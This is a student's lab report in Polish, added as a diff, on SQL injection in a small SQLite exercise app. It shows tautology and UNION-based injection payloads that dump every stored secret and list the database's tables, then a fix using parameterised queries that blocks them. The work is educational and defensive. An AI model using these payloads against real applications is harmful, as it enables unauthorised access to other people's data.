@@ -1,0 +1,58 @@
+Adam Wieleba, 337634, https://github.com/AdamWieleba/OchronaDanych-zadania/tree/main/CW7
+
+Zadanie 1
+1.1
+Klucz 1234:
+Liczba wierszy: 1
+anna: Hello world
+
+1.2
+OperationalError: unrecognized token: "'''"
+Jest o jeden ' za dużo w zapytaniu SQL, więc jego sładnia jest niepoprawna
+
+1.3
+Klucz na wejscie: ' OR '1'='1' --
+wtedy:
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' OR '1'='1' --'
+-
+Liczba wierszy: 4
+anna: Hello world
+piotr: Top secret
+muszkieter: Jeden za wszystkich
+admin: Szyfr do sejfu: 7319 (fikcyjny)
+
+1.4
+Klucz na wejscie: ' UNION SELECT type, name FROM sqlite_master --
+wtedy:
+SELECT wlasciciel, sekret FROM sekrety WHERE klucz = '' UNION SELECT type, name FROM sqlite_master --'
+-
+Liczba wierszy: 2
+table: konta
+table: sekrety
+
+Dane wejściowe za pomocą specjalnych wyrażeń sql, np. ', OR, UNION zmodyfikowały zapytanie SQL, aby otrzymać "nadmiarowe" dane.
+
+
+
+Zadanie 2
+
+Zmiana w kodzie:
+zapytanie = "SELECT wlasciciel, sekret FROM sekrety WHERE klucz = ?"
+[...]
+wiersze = db.execute(zapytanie, (klucz,)).fetchall()
+
+Klucz:  ' OR '1'='1' --
+Przed:  Liczba wierszy: 4 [...]
+Po:     Liczba wierszy: 0
+
+Klucz:  ' UNION SELECT type, name FROM sqlite_master --
+Przed:  Liczba wierszy: 2 [...]
+Po:     Liczba wierszy: 0
+
+Klucz:  d'Artagnan
+Liczba wierszy: 1
+muszkieter: Jeden za wszystkich
+
+Żaden testowany atak nie zwraca użytkownikowi żadnych danych SQL ani informacji o błędzie. 
+
+Parametry przekazują wartości osobno od składni SQL, więc nie mogą jej zmienić. Parametr nie może zastąpić nazwy tabeli.
